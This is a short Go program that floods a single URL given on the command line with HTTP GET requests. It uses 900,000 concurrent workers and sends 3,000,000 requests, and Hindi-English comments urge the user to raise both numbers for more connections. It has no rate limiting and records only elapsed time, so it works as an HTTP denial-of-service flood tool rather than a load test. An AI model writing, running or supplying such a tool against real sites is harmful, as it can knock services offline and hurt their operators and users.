package main

import (
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <url>")
		return
	}

	url := os.Args[1]
	urls := []string{url}

	startTime := time.Now()
	fmt.Printf("Starting Script for URL: %s\n", url)

	// Configure HTTP client with Keep-Alive
	client := &http.Client{
		Timeout: 250 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:    100,
			IdleConnTimeout: 90 * time.Second,
		},
	}

	// jyada connections ke liye worker edit karo
	numWorkers := 900000
	urlCh := make(chan string, numWorkers)
	var wg sync.WaitGroup

	// Create workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(urlCh, &wg, client)
	}

	// Send URLs to workers
	for _, u := range urls {
		for i := 0; i < 3000000/len(urls); i++ {
			urlCh <- u
		}
	}
	// total request ke liye edit upper code
	close(urlCh)
	wg.Wait()

	elapsedTime := time.Since(startTime)
	fmt.Printf("Total Time: %s\n", elapsedTime)
}

func worker(urlCh chan string, wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()

	for url := range urlCh {
		resp, err := client.Get(url)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		// Ensure proper handling of goroutines by closing the response body immediately after reading
		defer resp.Body.Close()

		// Add error handling for non-200 status codes
		if resp.StatusCode != http.StatusOK {
			fmt.Printf("Request Failed with Status: %s\n", resp.Status)
			// Handle the error accordingly
		}
	}
}
